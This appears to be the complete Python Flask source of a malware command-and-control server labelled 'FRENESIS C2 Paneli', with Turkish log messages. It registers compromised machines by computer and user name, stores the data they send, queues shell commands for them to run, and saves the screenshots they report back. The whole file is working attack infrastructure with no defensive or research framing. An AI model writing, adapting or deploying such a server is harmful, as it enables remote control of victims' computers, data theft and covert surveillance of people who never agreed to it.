from flask import Flask, request, jsonify, send_file
import json
import os
from datetime import datetime
from threading import Lock
import logging

app = Flask(__name__)

DATA_DIR = "data"
os.makedirs(DATA_DIR, exist_ok=True)

clients = {}
pending_commands = {}
client_lock = Lock()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@app.route('/')
def dashboard():
    try:
        return send_file('templates/index.html')
    except:
        return "<h1>FRENESIS C2 Paneli</h1><p>Çalışıyor...</p>"

@app.route('/register', methods=['POST'])
def register_client():
    data = request.json
    client_id = f"{data.get('computer_name', 'UNKNOWN')}_{data.get('user', 'UNKNOWN')}_{int(datetime.now().timestamp())}"
    
    with client_lock:
        clients[client_id] = {
            **data,
            'last_seen': datetime.now().isoformat(),
            'first_seen': data.get('first_sein', datetime.now().isoformat()),
            'ip': request.remote_addr
        }
        pending_commands[client_id] = []
    
    client_file = os.path.join(DATA_DIR, f"{client_id}.json")
    with open(client_file, 'w') as f:
        json.dump(clients[client_id], f, indent=2)
    
    logger.info(f"Yeni istemci: {client_id}")
    return jsonify({"client_id": client_id, "status": "registered"})

@app.route('/data', methods=['POST'])
def receive_data():
    data = request.json
    client_id = data.get('client_id')
    
    if client_id:
        with client_lock:
            if client_id in clients:
                clients[client_id]['last_seen'] = datetime.now().isoformat()
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        data_file = os.path.join(DATA_DIR, f"{client_id}_data_{timestamp}.json")
        
        with open(data_file, 'w') as f:
            json.dump(data.get('data', {}), f, indent=2)
        
        logger.info(f"Veri alındı: {client_id}")
        return jsonify({"status": "received"})
    
    return jsonify({"error": "Invalid client"}), 400

@app.route('/cmd/<client_id>', methods=['GET'])
def get_commands(client_id):
    with client_lock:
        if client_id in pending_commands:
            commands = pending_commands[client_id].copy()
            pending_commands[client_id].clear()
            return jsonify({"commands": commands})
    return jsonify({"commands": []})

@app.route('/cmd', methods=['POST'])
def send_command():
    data = request.json
    client_id = data.get('client_id')
    command = data.get('command', {})
    
    with client_lock:
        if client_id in pending_commands:
            command_entry = {
                "id": int(datetime.now().timestamp()),
                "type": command.get("type", "shell"),
                "data": command.get("data", "")
            }
            pending_commands[client_id].append(command_entry)
            
            cmd_log = os.path.join(DATA_DIR, f"commands.log")
            with open(cmd_log, 'a') as f:
                f.write(f"{datetime.now().isoformat()} | {client_id} | {command_entry}\n")
            
            logger.info(f"Komut gönderildi: {client_id}")
            return jsonify({"status": "queued", "command_id": command_entry["id"]})
    
    return jsonify({"error": "Client not found"}), 404

@app.route('/report', methods=['POST'])
def command_report():
    data = request.json
    client_id = data.get('client_id')
    result = data.get('result', {})
    
    report_file = os.path.join(DATA_DIR, f"{client_id}_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(report_file, 'w') as f:
        json.dump({"client_id": client_id, "result": result}, f, indent=2)
    
    if result.get('type') == 'screenshot' and result.get('output'):
        try:
            import base64
            img_data = result['output']
            if ',' in img_data:
                img_data = img_data.split(',')[1]
            
            screenshot_dir = os.path.join(DATA_DIR, "screenshots", client_id)
            os.makedirs(screenshot_dir, exist_ok=True)
            
            filename = os.path.join(screenshot_dir, f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(img_data))
            
            logger.info(f"Ekran görüntüsü kaydedildi: {filename}")
        except Exception as e:
            logger.error(f"Ekran görüntüsü hatası: {e}")
    
    logger.info(f"Rapor alındı: {client_id}")
    return jsonify({"status": "received"})

@app.route('/api/clients', methods=['GET'])
def api_clients():
    with client_lock:
        return jsonify(clients)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
